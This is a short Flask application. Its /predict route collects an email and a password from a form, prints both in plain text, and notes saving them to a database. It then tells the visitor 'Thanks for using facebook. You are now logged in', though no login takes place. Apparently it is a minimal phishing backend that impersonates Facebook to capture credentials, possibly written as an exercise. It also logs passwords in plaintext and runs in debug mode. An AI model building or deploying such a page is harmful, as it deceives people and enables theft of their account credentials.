from flask import Flask, render_template, request

app = Flask(__name__)
@app.route("/")
# def index():
#     return render_template("form.html")

@app.route("/predict", methods=["GET","POST"])
def hello_world():
    if request.method=="POST":
        name = request.form["email"]
        password = request.form["password"]
        print(f"The name is {name} and the password is {password}")
        #save it to the database
        return "<b>Thanks for using facebook. You are now logged in the system</b>"
    return render_template("form.html")
app.run(debug=True)